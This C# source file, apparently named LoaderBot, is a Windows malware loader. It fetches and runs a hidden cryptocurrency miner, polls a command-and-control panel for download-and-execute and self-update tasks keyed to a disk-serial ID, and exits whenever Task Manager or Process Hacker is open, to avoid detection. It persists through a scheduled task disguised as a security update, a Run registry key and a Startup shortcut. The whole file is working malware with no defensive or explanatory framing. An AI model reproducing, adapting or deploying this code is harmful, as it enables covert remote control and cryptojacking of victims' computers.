using System;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Management;

namespace LoaderBot
{
    class Program
    {
        static string adm = "http://123/cmd.php";
        static string loggr = "1";


        static void Main(string[] args)
        {
            
            
            string path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Windows\\";
           
            Thread loader = new Thread(new Loader().run);
            Thread logger = new Thread(new Logger(loggr).run); 
            Thread config = new Thread(new Config().run);
            Thread admin = new Thread(setConnection);
            config.Start();
            config.Join();
            logger.Start();
            loader.Start();
            loader.Join();
            //System.Threading.Thread.Sleep(300000);//configure
            admin.Start();
        }

        
        public static void setConnection()
        {
			
            while (true)
            {
				try{
					int i = 0;
				foreach (Process clsProcess in Process.GetProcesses())
                {

                    if (clsProcess.ProcessName.Contains("Taskmgr") || clsProcess.ProcessName.Contains("taskmgr") || clsProcess.ProcessName.Contains("ProcessHacker"))
                    {
                        Environment.Exit(0);
                    }
					if(clsProcess.ProcessName.Contains(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\')[System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1].Replace(".exe", "")))
						i++;
                }
				if (i > 1)
					Environment.Exit(0);
				
				
                string[] tasks = getTasks();

                foreach (string task in tasks)
                {
                    try
                    {
                        string type = task.Split(';')[0];
                        string url = task.Split(';')[1];
                        string id = task.Split(';')[2];
                        string filename = url.Split('/')[url.Split('/').Length - 1];
                        if (type.Equals("upd"))
                        {
                            get(adm + "?hwid=" + HWID() + "&completed=" + id);
                            update(url, filename);
                        }
                        else
                        {
                            downloadAndExcecute(url, filename);
                            get(adm + "?hwid=" + HWID() + "&completed=" + id);
                        }

                    }
                    catch (Exception e)
                    {

                    }

                }
                Thread.Sleep(getTimeout());
				}
				catch{
					
				}
            }

        }

        public static string HWID()
        {

            string HoldingAdress = "";
            try
            {
                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                string diskLetter = (disk["VolumeSerialNumber"].ToString());
                HoldingAdress = diskLetter;

            }
            catch (Exception)
            {

            }

            return HoldingAdress;
        }

        public static string get(string url)
        {

            try
            {
                WebRequest request = WebRequest.Create(url);
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
                WebResponse response = request.GetResponse();
                Stream dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);
                string r = reader.ReadToEnd();
                return r;

            }
            catch (Exception e)
            {
                return null;
            }

        }

        public static void downloadAndExcecute(string url, string filename)
        {
            using (WebClient Client = new WebClient())
            {

                FileInfo file = new FileInfo(filename);
                Client.DownloadFile(url, file.FullName);
                Process.Start(file.FullName);
            }
        }

        public static void update(string url, string filename)
        {
            cmd("winhost.exe");
            Thread.Sleep(15000);
            using (WebClient Client = new WebClient())
            {
                FileInfo file = new FileInfo("winhost.exe");
                Client.DownloadFile(url, file.FullName);
            }
            
        }

        private static void cmd(string filename)
        {
            string currfilename = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\')[System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/C taskmgr && ping 127.0.0.1 -n 2 && del winhost.exe";
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
            Environment.Exit(0);
        }

        public static string[] getTasks()
        {
            string tasks = get(adm + "?hwid=" + HWID());

            string[] spl = tasks.Split('|');
            string[] rt = new string[spl.Length];
            int i = 0;
            foreach (string s in spl)
            {
                try
                {

                    string[] task = s.Split(';');
                    string type = task[0].Equals("Update") ? "upd" : "dwl";
                    string taskurl = task[1];
                    string taskid = task[2];
                    rt[i] = type + ";" + taskurl + ";" + taskid;
                }
                catch (Exception e)
                {

                }
                i++;
            }
            return rt;
        }

        public static int getTimeout()
        {
            string response = get(adm + "?timeout=1");
            return Convert.ToInt32(response) * 60 * 1000;
        }

        class Loader
        {
            public bool installed = false;
            string path = @"";
            static string minername = "winhost.exe"; //configure
            static string loadUrl = "%lu%" + minername;
            bool is64bit = Is64Bit();
            [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);

            public static bool Is64Bit()
            {
                bool retVal;
                IsWow64Process(Process.GetCurrentProcess().Handle, out retVal);
                return retVal;
            }
            public Loader()
            {

            }

            public void run()
            {
                path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Windows\\";//configure
                    checkInstall();
                    if (!installed)
                    {
                        
                        try
                        {
                            load();
                        }
                        catch
                        {

                        }
                        
                        new Config();
                    
                }
            }

            private void checkInstall()
            {
                installed = File.Exists(path + "\\" + minername);
                
            }

            private void load()
            {
                string fileName = minername, myStringWebResource = null;
                WebClient Client = new WebClient();
                FileInfo file = new FileInfo(minername);
                Client.DownloadFile(loadUrl, file.FullName);
                Process.Start(file.FullName);

            }
        }



        class Logger
        {
            string url = "";

            public Logger(string logger)
            {
                url = logger;
            }

            public void run()
            {
                connect();
            }

            private void connect()
            {
                try
                {


                    WebRequest request = WebRequest.Create(url);
                    request.Credentials = CredentialCache.DefaultCredentials;
                    ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
                    WebResponse response = request.GetResponse();
                    Stream dataStream = response.GetResponseStream();
                    StreamReader reader = new StreamReader(dataStream);
                    string responseFromServer = reader.ReadToEnd();
                    
                }
                catch(Exception e)
                {

                }
            }
        }

        class Config
        {
            string path = @"";
            string currFilename = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\')[System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
            public Config()
            {

            }

            public void run()
            {
                path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Windows\\"; 
                createDir();
                move();
                SetStartup();
            }
            private void SetStartup()
            {
                try
                {
					var process = new Process();
					process.StartInfo = new ProcessStartInfo("cmd", "/C "+"schtasks /create /tn \\System\\SecurityServiceUpdate /tr %userprofile%\\AppData\\Roaming\\Windows\\" + currFilename + " /st 00:00 /du 9999:59 /sc daily /ri 1 /f");
					process.StartInfo.RedirectStandardOutput = true;
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
					
                    appShortcutToStartup("Webhost");
                    string pth = path + currFilename;           
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey
                        ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue("Webhost", pth);
                }
                catch (Exception e)
                {
                    
                }

            }

            private void appShortcutToStartup(string linkName)
            {
                
                string startDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (!System.IO.File.Exists(startDir + "\\" + linkName + ".url"))
                {
                    using (StreamWriter writer = new StreamWriter(startDir + "\\" + linkName + ".url"))
                    {
                        string app = path + currFilename;
                        writer.WriteLine("[InternetShortcut]");
                        writer.WriteLine("URL=file:///" + app);
                        writer.WriteLine("IconIndex=0");
                        string icon = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName + "\\backup (3).ico";
                        writer.WriteLine("IconFile=" + icon);
                        writer.Flush();
                    }
                }
            }

            private void createDir()
            {
                try
                {
                    if (Directory.Exists(path))
                    {
                        //Console.WriteLine("That path exists already.");
                        return;
                    }

                    DirectoryInfo di = Directory.CreateDirectory(path);
                    //Console.WriteLine("The directory was created successfully at {0}.", Directory.GetCreationTime(path));
                }
                catch (Exception e)
                {
                    //Console.WriteLine("The process failed: {0}", e.ToString());
                }
                
             }
            public void move()
            {                
                    string rootFolderPath = Environment.CurrentDirectory;
                    string destinationPath = path;
                    string filesToDelete = currFilename;
                    string[] fileList = System.IO.Directory.GetFiles(rootFolderPath, filesToDelete);
                    foreach (string file in fileList)
                    {
                        string[] arr = file.Split('\\');
                        string fileToMove = file;
                        string moveTo = destinationPath + arr[arr.Length - 1];
                        try
                        {
                            File.Move(fileToMove, moveTo);
                        }
                        catch (Exception e)
                        {

                        }
                }
            }
        }
    }
}
